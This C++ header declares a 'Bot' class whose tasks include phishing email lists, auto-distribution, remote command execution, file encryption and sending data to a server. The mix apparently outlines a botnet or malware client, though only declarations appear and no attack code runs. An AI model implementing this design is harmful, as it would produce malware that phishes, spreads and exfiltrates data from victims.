#ifndef BOT_H
#define BOT_H

#include "BotBase.h"
#include <string>
#include <map>
#include <vector>
#include <future>
#include <atomic>

class Bot : public BotBase {
public:
    enum TaskType { DOWNLOAD, UPLOAD, COPY, DELETE, MOVE, RENAME, EXECUTE, ENCRYPT, DECRYPT, AUTO_DISTRIBUTE, PHISHING, INSTALL_SOFTWARE, SEND_DATA };
    enum TaskPriority { LOW, MEDIUM, HIGH };
    enum State { WAITING, RUNNING, COMPLETED, FAILED, PAUSED };

    Bot(const std::string &id, TaskType taskType, TaskPriority priority, const std::map<std::string, std::string> &params, const std::vector<std::string> &dependencies);

    void performTask() override;
    void stop() override;
    void updateTask(int taskType, const std::map<std::string, std::string> &params) override;
    void setResourceLimits(int cpuLimit, int memoryLimit) override;
    void setParallelTaskLimit(int limit) override;
    std::string getId() const override;
    int getPriority() const override;
    int getState() const override;
    bool areDependenciesCompleted(const std::map<std::string, int> &taskStates) const override;
    void logAction(const std::string &message) override;
    std::future<void> performTaskAsync() override;

    void pause() override;
    void resume() override;

private:
    std::string id;
    TaskType taskType;
    TaskPriority priority;
    std::map<std::string, std::string> params;
    std::atomic<bool> stopped;
    std::atomic<bool> paused;
    State state;
    std::vector<std::string> dependencies;
    int cpuLimit;
    int memoryLimit;
    int parallelTaskLimit;

    std::string taskTypeToString(TaskType taskType) const;
    void recoverFromError();
    void applyResourceLimits();

    void download(const std::string &url, const std::string &destination);
    void upload(const std::string &filePath, const std::string &url);
    void copy(const std::string &source, const std::string &destination);
    void deleteFileInternal(const std::string &filePath);
    void move(const std::string &source, const std::string &destination);
    void rename(const std::string &source, const std::string &destination);
    void execute(const std::string &command);
    void encrypt(const std::string &filePath, const std::string &key);
    void decrypt(const std::string &filePath, const std::string &key);
    void autoDistribute(const std::string &source, const std::string &destinations);
    void phishing(const std::string &emailList, const std::string &message);
    void installSoftware(const std::string &softwareUrl);
    void sendData(const std::string &data, const std::string &serverUrl);

    std::future<void> downloadAsync(const std::string &url, const std::string &destination);
    std::future<void> uploadAsync(const std::string &filePath, const std::string &url);
    std::future<void> copyAsync(const std::string &source, const std::string &destination);
    std::future<void> deleteAsync(const std::string &filePath);
    std::future<void> moveAsync(const std::string &source, const std::string &destination);
    std::future<void> renameAsync(const std::string &source, const std::string &destination);
    std::future<void> executeAsync(const std::string &command);
    std::future<void> encryptAsync(const std::string &filePath, const std::string &key);
    std::future<void> decryptAsync(const std::string &filePath, const std::string &key);
    std::future<void> autoDistributeAsync(const std::string &source, const std::string &destinations);
    std::future<void> phishingAsync(const std::string &emailList, const std::string &message);
    std::future<void> installSoftwareAsync(const std::string &softwareUrl);
    std::future<void> sendDataAsync(const std::string &data, const std::string &serverUrl);

    void retry(const std::function<void()> &task, int attempts);
    void uploadToCloud(const std::string &filePath);
    void downloadFromCloud(const std::string &fileName, const std::string &destination);
};

#endif // BOT_H




